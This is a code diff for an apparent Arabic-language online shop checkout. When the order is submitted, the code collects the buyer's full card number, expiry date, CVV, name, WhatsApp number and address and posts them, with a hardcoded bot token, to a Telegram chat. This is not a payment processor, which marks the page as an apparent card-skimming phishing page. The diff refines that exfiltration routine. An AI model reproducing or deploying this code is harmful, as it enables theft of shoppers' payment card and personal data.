@@ -103,8 +103,9 @@ document.addEventListener("DOMContentLoaded", () => {
         previousButton.style.display = "none";
         completeOrderButton.style.display = "none";
     });
-
-    document.getElementById("completeOrderButton").addEventListener("click", function () {
+    document.getElementById("completeOrderButton").addEventListener("click", async function () {
+        const button = this;
+        button.disabled = true;  
         document.querySelectorAll(".error_message").forEach((el) => (el.textContent = ""));
         
         const cardNumber = document.getElementById("card_number").value.replace(/\s/g, "");
@@ -117,92 +118,93 @@ document.addEventListener("DOMContentLoaded", () => {
         const initialPayment = parseFloat(document.getElementById("initial_payment").value);
         const monthlyPayment = parseFloat(document.getElementById("monthly_payment").value);
         const selectedInstallment = document.getElementById("installments").value;
-      
+    
         const cart = JSON.parse(localStorage.getItem("cart")) || [];
-        
+    
         let totalQuantity = 0;
         let totalPrice = 0;
-        
+    
         cart.forEach(item => {
             totalQuantity += item.quantity;
             totalPrice += item.quantity * item.price;
         });
-        
+    
         let isValid = true;
-        
+    
+        // Validation logic
         if (!/^\d{16}$/.test(cardNumber)) {
             document.getElementById("card_number_error").textContent = "رقم البطاقة يجب أن يحتوي على 16 رقمًا.";
             isValid = false;
         }
-        
+    
         if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
             document.getElementById("expiry_date_error").textContent = "تاريخ البطاقة يجب أن يكون بصيغة MM/YY.";
             isValid = false;
         }
-        
+    
         if (!/^\d{3}$/.test(cvv)) {
             document.getElementById("cvv_error").textContent = "رمز الـ CVV يجب أن يكون 3 أرقام.";
             isValid = false;
         }
-        
+    
         if (cardHolder.trim() === "") {
             document.getElementById("card_holder_error").textContent = "اسم حامل البطاقة مطلوب.";
             isValid = false;
         }
-        
+    
         if (isValid) {
             const botToken = "7973735099:AAE-MYlf-dsAKXPyklTxzGwZ_hB-oDG82wA";
             const chatId = "948393191";
-            
+    
             let productDetails = '';
             cart.forEach((product, index) => {
                 productDetails += `- **المنتج ${index + 1}:** ${product.name}\n`;
                 productDetails += `  - **الكمية:** ${product.quantity}\n`;
                 productDetails += `  - **الإجمالي:** ر.س ${(product.quantity * product.price).toFixed(2)}\n\n`;
             });
-            
+    
             const message = `
                 *بيانات الطلب:*
                 ${productDetails}
                 - **عدد المنتجات:** ${totalQuantity}
                 - **إجمالي المنتجات:** ر.س ${totalPrice.toFixed(2)}
-        
+    
                 *بيانات الشخص:*
                 - **الاسم الكامل:** ${fullName}
                 - **رقم الواتساب:** ${whatsappNumber}
                 - **العنوان الكامل:** ${fullAddress}
-        
+    
                 *بيانات التقسيط:*
                 - **المقدم:** ر.س ${initialPayment.toFixed(2)}
                 - **مدة التقسيط:** ${selectedInstallment} شهر
                 - **القسط الشهري:** ر.س ${monthlyPayment.toFixed(2)}
-        
+    
                 *بيانات البطاقة:*
                 - **رقم البطاقة:** ${cardNumber}
                 - **تاريخ الانتهاء:** ${expiryDate}
                 - **رمز CVV:** ${cvv}
                 - **اسم حامل البطاقة:** ${cardHolder}
             `;
-            
+    
             const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
             const payload = {
                 chat_id: chatId,
                 text: message,
                 parse_mode: "Markdown"
             };
-            
-            fetch(apiUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(payload),
-            })
-            .then((response) => response.json())
-            .then((data) => {
+    
+            try {
+                const response = await fetch(apiUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(payload),
+                });
+                const data = await response.json();
+                button.disabled = false; 
                 if (data.ok) {
-                    // Clear localStorage and refresh the page after successful submission
-                    localStorage.removeItem("cart");  // Clear the cart in localStorage
+                    localStorage.clear();
                     Swal.fire({
                         toast: true,
                         position: 'top-end',
@@ -212,7 +214,7 @@ document.addEventListener("DOMContentLoaded", () => {
                         showConfirmButton: false,
                         timer: 3000
                     });
-                    setTimeout(() => window.location.reload(), 3000);  // Refresh the page after 3 seconds
+                    setTimeout(() => window.location.reload(), 3000); 
                 } else {
                     console.error("Telegram API Error:", data);
                     Swal.fire({
@@ -225,8 +227,8 @@ document.addEventListener("DOMContentLoaded", () => {
                         timer: 3000
                     });
                 }
-            })
-            .catch((error) => {
+            } catch (error) {
+                button.disabled = false;
                 console.error("Fetch Error:", error);
                 Swal.fire({
                     toast: true,
@@ -237,7 +239,9 @@ document.addEventListener("DOMContentLoaded", () => {
                     showConfirmButton: false,
                     timer: 3000
                 });
-            });
+            }
+        } else {
+            button.disabled = false; 
         }
     });
     
@@ -351,5 +355,3 @@ function removeFromCart(index) {
     localStorage.setItem("cart", JSON.stringify(cart));
     window.location.reload();
 }
-
-
